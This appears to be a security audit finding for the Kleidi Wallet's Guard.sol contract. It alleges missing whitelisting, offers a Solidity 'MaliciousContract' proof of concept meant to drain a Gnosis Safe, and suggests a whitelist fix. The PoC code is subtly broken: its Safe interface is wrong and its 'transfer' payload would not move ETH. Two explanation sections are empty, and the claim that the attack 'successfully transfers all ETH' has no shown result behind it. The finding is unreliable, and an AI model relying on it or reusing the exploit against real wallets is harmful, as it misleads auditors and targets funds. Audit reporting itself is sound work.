# Vulnerability details

## Summary

A critical vulnerability has been identified in the `Guard.sol` contract of the **Kleidi Wallet** system. The `checkTransaction` function within the Guard contract lacks comprehensive parameter validation, specifically omitting a whitelisting mechanism for target addresses and function selectors. This omission allows authorized owners of the Gnosis Safe multisig wallet to execute arbitrary `Call` operations to any contract without restrictions, potentially enabling unauthorized fund transfers or malicious contract interactions.

## Vulnerability Details

### **Unrestricted Call Operations in Guard.sol**

The vulnerability stems from the `checkTransaction` function in the `Guard.sol` contract, which does not enforce a whitelist of approved contracts or function selectors. This oversight permits authorized multisig owners to perform arbitrary calls, undermining the intended security mechanisms.

#### **Guard Contract Function: checkTransaction**

```solidity
function checkTransaction(
    address to,
    uint256 value,
    bytes memory data,
    Enum.Operation operationType,
    uint256,
    uint256,
    uint256,
    address,
    address payable,
    bytes memory,
    address
) external view {
    if (to == msg.sender) {
        require(data.length == 0 && value == 0, "Guard: no self calls");
    }
    require(
        operationType == Enum.Operation.Call,
        "Guard: delegate call disallowed"
    );
}
```

**Explanation:**
- **Self-Call Restriction:** Prevents the Guard from executing its own functions with non-zero value or data.
- **Operation Type Restriction:** Only allows `Enum.Operation.Call`, explicitly disallowing `DelegateCall`.
- **Lack of Whitelisting:** No checks are implemented to ensure transactions target approved contracts or specific functions, allowing arbitrary interactions.

#### **Proof of Concept (PoC)**

To demonstrate the vulnerability, a Proof of Concept (PoC) is crafted where an authorized owner exploits the lack of whitelisting to execute an unauthorized transaction.

##### **1. Malicious Contract Deployment**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

interface IGnosisSafe {
    function execTransaction(
        address to,
        uint256 value,
        bytes calldata data,
        Enum.Operation operation
    ) external returns (bool success);
}

contract MaliciousContract {
    IGnosisSafe public safe;

    constructor(address _safe) {
        safe = IGnosisSafe(_safe);
    }

    function attack() external {
        // Craft payload to transfer funds to attacker
        bytes memory payload = abi.encodeWithSignature(
            "transfer(address,uint256)",
            msg.sender,
            address(safe).balance
        );

        // Execute unauthorized transaction via multisig
        safe.execTransaction(
            msg.sender,
            0,
            payload,
            Enum.Operation.Call
        );
    }
}
```

**Explanation:**
- **Interface Definition:** Defines the `execTransaction` function from the Gnosis Safe interface.
- **MaliciousContract:** Initializes with the multisig address and contains an `attack` function.
- **Attack Function:** Constructs a payload to call the `transfer` function, aiming to drain all funds to the attacker's address by invoking `execTransaction` with `Enum.Operation.Call`, which is permitted by the Guard.

**Explanation:**


**Explanation:**
- The `attack` function successfully transfers all ETH from the multisig to the attacker's address.
- This operation bypasses the Timelock's whitelisting and delay mechanisms, exploiting the Guard's permissive `checkTransaction` function.

## Impact

The absence of a whitelisting mechanism in the `Guard.sol` contract allows authorized owners to perform arbitrary `Call` operations. This vulnerability can lead to:

- **Unauthorized Fund Transfers:** Attackers can drain funds from the multisig wallet without restrictions.
- **Malicious Contract Interactions:** Execution of harmful contracts that can alter the wallet's state or behavior.
- **Bypassing Timelock Protections:** Circumventing the intended delays and approval processes, undermining the wallet's security architecture.

Given these potential exploits, the vulnerability poses a **high severity risk** to the integrity and security of the **Kleidi Wallet** system.

## Recommendations

To mitigate the identified vulnerability and enhance the security of the **Kleidi Wallet** system, the following measures are recommended:

### **1. Implement Whitelisting in Guard.sol**

Introduce a whitelist mechanism to restrict interactions to approved contracts and function selectors.

```solidity
mapping(address => mapping(bytes4 => bool)) public whitelist;

function addToWhitelist(address _contract, bytes4 _selector) external onlyOwner {
    whitelist[_contract][_selector] = true;
}

function removeFromWhitelist(address _contract, bytes4 _selector) external onlyOwner {
    whitelist[_contract][_selector] = false;
}

function checkTransaction(
    address to,
    uint256 value,
    bytes memory data,
    Enum.Operation operationType,
    uint256,
    uint256,
    uint256,
    address,
    address payable,
    bytes memory,
    address
) external view {
    if (to == msg.sender) {
        require(data.length == 0 && value == 0, "Guard: no self calls");
    }
    require(
        operationType == Enum.Operation.Call,
        "Guard: delegate call disallowed"
    );

    bytes4 selector = data.getFunctionSignature();
    require(whitelist[to][selector], "Guard: Function not whitelisted");
}
```

**Explanation:**
- **Whitelist Mapping:** Maintains a list of approved contract addresses and their corresponding function selectors.
- **Administrative Functions:** `addToWhitelist` and `removeFromWhitelist` allow the contract owner to manage the whitelist.
- **Enhanced checkTransaction:** Ensures that only whitelisted functions can be executed, preventing arbitrary calls.

### **2. Restrict Direct Multisig Interactions**

Ensure that all critical transactions are routed through the Timelock, leveraging its whitelisting and delay features.

- **Enforce Timelock Mediation:** Configure the multisig to require that all significant transactions pass through the Timelock contract.
- **Disable Direct Execution:** Prevent owners from initiating transactions directly without Timelock approval.
